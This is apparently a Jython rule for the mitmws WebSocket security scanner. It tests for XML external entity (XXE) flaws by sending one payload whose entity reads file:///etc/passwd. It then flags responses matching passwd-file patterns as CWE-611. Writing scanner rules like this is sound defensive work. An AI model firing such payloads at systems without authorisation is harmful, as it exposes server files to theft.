from com.mitmws.anomalydetection import DetectedAnomaly
from com.mitmws.httpproxy.trafficlogger import WebsocketTrafficRecord
from java.util import ArrayList
from com.mitmws.anomalydetection import DetectionRuleSelfTestStatus

def getName():
    return "XXE file disclosure"

def getActiveRuleType():
    return "PAYLOAD"

def getDescription():
    return "Tests for XXE"

def getCategory():
    return "XXE"
    
def getPayloads():
    return [
    '<!--?xml version="1.0" ?--><!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]><userInfo><firstName>John</firstName><lastName>&ent;</lastName></userInfo>'
    ]

def getFrameScope():
  return ["TEXT","PING","PONG"]

def getTestScope():
  return "APPLICATION"

def analyze( conversations ):
    anomalies = ArrayList()
    for conversation in conversations:
      for websocket_message in conversation:
              if bool(websocket_message.getFrame().payloadMatchesRegex(".*(root|daemon|bin|sys|sync|games|man|lp|mail|news).*(bin|bash|nologin|ksh).*")):
                  anomaly = DetectedAnomaly(1004, "HIGH", "Regex match", "CWE-611", "XXE", "Improper Restriction of XML External Entity Reference")
                  anomaly.setWebsocketMsgId(websocket_message.getFrame().getMessageUUID())
                  anomaly.setConversationUuid(websocket_message.getFrame().getConversationUUID())
                  anomalies.add(anomaly)
    return anomalies

def selfTest():
    result = DetectionRuleSelfTestStatus()
    result.setSelfTestOK(True)
    return result
